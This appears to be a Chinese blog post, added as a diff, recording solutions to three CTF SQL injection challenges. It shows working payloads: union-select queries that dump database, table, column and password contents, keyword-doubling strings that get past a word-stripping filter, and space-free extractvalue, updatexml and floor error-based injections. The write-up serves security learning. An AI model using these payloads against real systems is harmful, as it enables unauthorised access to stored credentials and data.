@@ -1,0 +1,96 @@
+---
+layout:     post                    # 使用的布局（不需要改）
+title:      对于多种sqli的练习与总结(一)               # 标题 
+subtitle:   实操加强对sqli的熟悉度
+date:       2020-04-01             # 时间
+author:     z0L1n                      # 作者
+header-img: img/post-bg-2015.jpg    #这篇文章标题背景图片
+catalog: true                       # 是否归档
+tags:                               #标签
+    - 基础
+---
+
+> 以下为做完题之后的整理，对于个人来说为了形成一个测试流程习惯
+
+## 0x00：堆叠注入-lovesql
+首先进入页面，发现有两个输入框，分别对于用户名和密码加上单引号测试闭合。  
+![](https://wx2.sinaimg.cn/mw690/007IMTbqgy1gdekjmd8ewj30kx0d20xo.jpg)
+![](https://wx1.sinaimg.cn/mw690/007IMTbqgy1gdekjdkyzuj30i905574a.jpg)
+报错点在密码处，首先尝试最简单的联合注入查询，通过select 语句探询字段数以及观察回显字段。  
+![](https://wx4.sinaimg.cn/mw690/007IMTbqgy1gdekmavozaj30hr0atgol.jpg)
+发现在第三个字段回显信息，那个我们可以利用以下语句找到flag。
+` 123' union select 1,2,concat(database())#`
+![](https://wx2.sinaimg.cn/mw690/007IMTbqgy1gdekmi7h0aj30ej0ao41e.jpg)
+` 123' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='geek'#`
+![](https://wx2.sinaimg.cn/mw690/007IMTbqgy1gdekmdqsw5j30hs06xac2.jpg)
+` 123' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1'#`
+![](https://wx3.sinaimg.cn/mw690/007IMTbqgy1gdeklt62lnj30hw067dho.jpg)
+` 123' union select 1,2,group_concat(password) from l0ve1ysq1#`
+![](https://wx3.sinaimg.cn/mw690/007IMTbqgy1gdeklq9wxpj30ho0aiq5f.jpg)
+找到flag，copy下来就容易看出了。  
+总结一下：该sqli没有过滤，在使用联合查询注入这个简单注入时没有受到阻拦，使用group_concat是为了将整个字段的内容连接起来避免遗漏，
+使用到了mysql特性数据库information_schema库，本次练习旨在提高熟悉程度以及小知识点的巩固。
+
+## 0x01绕过简单规则-babysql
+首先进入页面，依旧测试注入点，依旧和上述一样，用户密码为不同的输入，都加上单引号测试闭合以及注入点，这里就暂时不放上来了。   
+测试一下联合注入：`123' union select 1,2,3#`  
+报错回显：  
+![](https://wx4.sinaimg.cn/mw690/007IMTbqgy1gdeklmrmqpj30c103t742.jpg)
+仔细一看，我们的union和select去哪了？？？？原来过滤规则将union、select替换为空字符，可以猜测敏感词都会替换为空，分析一下，用户的输入会经过一次遍历，查找到危险词汇就会替换为空。
+由之前学习得知，双写这些词，就可以绕过：`123' uniunionon seleselectct 1,2,3#` 
+成功回显：
+![](https://wx4.sinaimg.cn/mw690/007IMTbqgy1gdeklj3x8jj30ej0afgoo.jpg)
+那么我们就来fuzz一下，看看哪些词会被替换成空，打开burp，接下来就是载入自己的sql字典遍历一下看一看：
+![](https://wx1.sinaimg.cn/mw690/007IMTbqgy1gdeklg1hjcj30t10epabv.jpg)
+这就知道了哪些词汇会被替换，我们要使用的时候直接双写！！！
+由于步骤和以上一样，就简单记录一下payload，不放图了（有点懒哈哈哈哈）  
+` 123' uniunionon seleselectct 1,2,concat(database())#`  
+` 123' uniunionon seleselectct 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema='geek'#`  
+` 123' uniunionon seleselectct 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name='b4bsql'#`  
+` 123' uniunionon seleselectct 1,2,group_concat(passwoorrd) frfromom b4bsql#`  
+总结一下：该题目添加了简单的过滤规则，输入比较容易绕过的类型，此处我使用了burp去遍历过滤词，便于后续的payload构造，此处依旧是联合注入，还是比较简单的一道题目。
+
+## 0x02hardsql
+首先进入页面，依旧开始测试注入点，还是和之前一样，密码为注入点，单引号闭合，#没有过滤，接着测试联合注入，页面响应为：
+![](https://wx2.sinaimg.cn/mw690/007IMTbqgy1gdekl09bgxj30px0budkt.jpg)
+有过滤规则，统一了错误页面，那么开始测试哪些sql用词被过滤，依旧打开burp，遍历过滤词：
+![](https://wx2.sinaimg.cn/mw690/007IMTbqgy1gdekkx4c9vj30s90gi767.jpg)
+可以看到过滤了空格、等号这些偏符号的都过滤了，联合注入也不能使用了，尝试堆叠注入，由于堆叠注入的使用条件非常有限，我们测试一下看看：
+![](https://wx2.sinaimg.cn/mw690/007IMTbqgy1gdekkstgcij30md08qdhf.jpg)
+可以看出这大概是不行的了，没法执行多条语句。接下来剩下报错注入和盲注，先尝试报错注入，所用到的所有词都没有过滤，由于这里空格被过滤了，用其他符号来代替完成：  
+`123'^extractvalue(1,concat(0x7e,(select(database())),0x7e))#`  
+![](https://wx3.sinaimg.cn/mw690/007IMTbqgy1gdekkpz8qdj30b705vgmg.jpg)
+报错信息回显，利用xpath错误回显我们需要的信息,那么就是说我们报错注入是成功的，接下来构造相关语句：
+`123'^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like('geek'))),0x7e))#`
+![](https://wx1.sinaimg.cn/mw690/007IMTbqgy1gdekkmqoczj30ba06fq3y.jpg)
+`123'^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like('H4rDsq1'))),0x7e))#`
+![](https://wx1.sinaimg.cn/mw690/007IMTbqgy1gdekjvam81j30dg08d40d.jpg)
+`123'^extractvalue(1,concat(0x7e,(select(password)from(H4rDsq1)),0x7e))#`  
+![](https://wx3.sinaimg.cn/mw690/007IMTbqgy1gdekjrvog0j30f205tt9v.jpg)
+咦，这个时候只显示了一半，搜索了一下，发现extractvalue和updatexml这两个常用的报错注入函数能查询的字符串最大长度为32，在显示内容过多时，可用截取函数substr或者left，right来截取或者使用concat函数的参数位置调换以此获取前后信息。
+这里我们就利用left或者right来尝试一下
+`123'^extractvalue(1,concat(0x7e,(select(right((password),30))from(H4rDsq1)),0x7e))#`    
+![](https://wx1.sinaimg.cn/mw690/007IMTbqgy1gdekjpb7p0j30ib07fdhu.jpg)
+这个时候我们拼接一下就完成了，这里总结以下：题目存在统一错误页面而且有错误信息回显，报错注入有一些会使用函数参数来返回错误信息，这一题使用到的是extractvalue，同类型的还有updatexml，都是利用xpath报错返回信息。  
+通过ExtractValue报错,注入语句如下:
+`and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));`  
+通过UpdateXml报错,注入语句如下:
+`and 1=(updatexml(1,concat(0x3a,(select user())),1))`   
+拓展一下经常看见的双查询：
+通过floor报错,注入语句如下:
+`and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);`这个报错查询主要是利用主键重复产生错误信息来回显。
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
